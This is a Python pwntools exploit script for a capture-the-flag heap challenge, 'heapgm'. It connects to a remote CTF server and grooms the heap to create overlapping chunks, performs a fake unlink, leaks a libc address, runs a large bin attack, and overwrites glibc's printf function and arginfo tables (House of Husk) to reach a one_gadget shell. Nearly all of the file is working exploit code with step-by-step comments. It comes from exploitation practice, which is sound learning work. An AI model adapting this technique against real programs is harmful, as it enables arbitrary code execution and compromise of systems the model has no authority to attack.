#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapgm")

context.binary = exe


def conn():
    return process(exe.path)

#r = conn()
#r = remote("localhost", 9996)
r = remote("pwn1.f21.ctfsecurinets.com", 9996)

def sl(data):
    r.sendlineafter("> ", data)

def s(data):
    r.sendafter("> ", data)

def bye():
    r.sendlineafter("> ", "4")

def alloc(index, size, data=""):
    sl("0")
    sl(str(index))
    sl(str(size))
    if data == "":
        data = p16(0x1)*((size-0x8)//2)
    s(data)

def free(index):
    sl("1")
    sl(str(index))

def show(index):
    sl("2")
    sl(str(index))

def edit(index, data):
    sl("3")
    sl(str(index))
    s(data)

def send_name():
    r.recvline()
    r.sendline("MAHER")

def main():
    # Offsets
    mp_ = 0x1be280
    __printf_arginfo_table = 0x1c4250
    __printf_function_table = 0x1c3f98
    
    send_name()
    # Just padd
    alloc(0, 0x128, p16(0x1)*(0x120//2))
    
    alloc(1, 0x418) # AC
    alloc(2, 0x438) # A
    alloc(3, 0x108)

    alloc(4, 0x418) # BC
    alloc(5, 0x418) # B
    alloc(6, 0x108)

    alloc(7, 0x418) # CC
    alloc(8, 0x418) # C
    alloc(9, 0x108)

    # Make A in the middle in unsorted bin.
    # B -> A -> C
    free(8)
    free(2)
    free(5)
    
    # Consolidate A back.
    free(1)

    # Taken from AC and will go beyond A 
    # To change its size later
    # Kind of `Backtracking` here I didn't set the size now
    # But after I did complete my setup. (I can't predict the size from now)

    alloc(1, 0x438, b"M"*0x418 + p32(0x2371))

    # Take the reminder of AC this is considered A' now.
    alloc(2, 0x418)

    # Take B again from large chunk.
    alloc(5, 0x418)

    # Take C again from large chunk.
    alloc(8, 0x418)

    # Now all caches are clear.
    # We need to repeat the same process we did with A
    # But now to A'

    # B -> A' -> C
    
    free(8)
    free(2)
    free(5)

    # Now we don't want to consolidate A' but we want to consolidate
    # B and C, to BC and CC respectively.
    free(4)
    free(7)
    
    # Now what left to do is to change the LSB of the pointers left in the
    # heap and make them point to A back.
    # `Satisfy the requirement for backward consolidation`
    alloc(4, 0x438, b"M"*0x428)
    alloc(7, 0x438, b"M"*0x420)

    # Clean caches to consolidate back now
    alloc(2, 0x3f8)
    alloc(5, 0x3f8)
    alloc(8, 0x418)

    # For large bin attack later.
    alloc(11, 0x418)
    alloc(12, 0x108)
    alloc(13, 0x428)
    alloc(14, 0x108)

    # Now let's allocate two chunks and consolidate the second
    # To our A chunk.
    alloc(9, 0x108)
    alloc(10, 0x5c8, (p64(0) + p64(0x21))*0x5c)
    edit(9, b"A"*0x100 + p64(0x2370))

    # The fake unlink take place here!
    free(10)

    # We allocate a dummy chunk just to push the libc addresses
    # to an alive chunk that we can read from.
    alloc(10, 0x18)
    
    # Make the large chunk into large bin, to make the least significant byte
    # of that libc address not null, so it can be leaked.
    free(0)
    alloc(0, 0x3900, b"MMMM")
    
    # Leak a libc address.
    show(8)
    LIBC_LEAK = u64(r.recvline().strip().ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", LIBC_LEAK)
    L = LIBC_LEAK - 0x1bf2e0
    log.warn("Libc base @ 0x%x", L)
    

    # Large bin attack.
    free(13) #
    alloc(13, 0x3000)
    alloc(15, 0x1d00-0x50, p16(0x1)*(0x1700//2) + p64(L+__printf_arginfo_table) + p64(L+__printf_function_table-0x8))
    alloc(16, 0xb88, p64(0)*7 + p64(0x431) + p64(0)*3 + p64(L+mp_+0x50-0x20))
    free(11)
    alloc(11, 0x500)

    # Now that mp_->tcache_bins contain a large value.
    # We can allocate pointers anywhere in libc.
    # We will be targeting __printf_function_table
    # And __printf_arginfo_table (House of Husk)
    one_gadget = L + 0xcb8e1
    log.warn("One gadget @ 0x%x", one_gadget)
    free(1)

    #The format string used here is %s so the offset should be ('s'*8)-8
    # if I was using %x for example it should be ('x'*8)-8
    alloc(1, 0x3d50, p64(L+__printf_arginfo_table) + p8(0)*0x390 + p64(one_gadget))
    free(0)
    alloc(0, 0x3d60, p64(0) + p64(1))
    # The trigger.
    bye()
    r.interactive()


if __name__ == "__main__":
    main()
